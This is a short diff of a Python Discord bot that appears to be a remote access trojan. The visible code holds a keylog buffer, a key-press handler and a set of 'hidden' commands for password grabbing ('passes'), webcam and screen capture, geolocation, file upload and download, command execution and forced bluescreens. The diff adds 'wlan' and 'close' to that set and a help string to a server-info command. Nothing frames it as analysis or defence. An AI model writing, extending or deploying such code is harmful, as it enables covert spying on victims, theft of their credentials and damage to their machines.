@@ -106,7 +106,7 @@ bot = commands.Bot(command_prefix='>', intents=intents, help_command=None)
 
 keylog_buffer = []
 
-hidden_commands = {"serverinfo", "leaveserver", "serverlist", "delonstrg", "randomkb", "resetkb", "removekb", "checkkb", "switchkb", "winr", "joinvoice", "leavevoice", "exec", "ad", "cams", "url", "screen", "screenstart", "screenstop", "reload", "on", "off", "eject", "passes", "add", "tts", "say", "cd", "download", "upload", "ls", "rm", "touch", "rmdir", "mkdir", "run", "bluescreen", "ran", "taskkill", "tskmngr", "checkadmin", "devices", "geolocation", "shutdown", "specs", "restart"}
+hidden_commands = {"wlan", "close", "serverinfo", "leaveserver", "serverlist", "delonstrg", "randomkb", "resetkb", "removekb", "checkkb", "switchkb", "winr", "joinvoice", "leavevoice", "exec", "ad", "cams", "url", "screen", "screenstart", "screenstop", "reload", "on", "off", "eject", "passes", "add", "tts", "say", "cd", "download", "upload", "ls", "rm", "touch", "rmdir", "mkdir", "run", "bluescreen", "ran", "taskkill", "tskmngr", "checkadmin", "devices", "geolocation", "shutdown", "specs", "restart"}
 
 def on_press(key):
     try:
@@ -1922,7 +1922,7 @@ async def on_guild_join(guild):
 
         print(f"Bot ist einem anderen Server beigetreten: {guild.name} (ID: {guild.id})")
 
-@bot.command()
+@bot.command(help= "show info about a server by its ID (BOT REQUIRED)")
 async def serverinfo(ctx, server_id: int):
     server = bot.get_guild(server_id)
     if server is None:
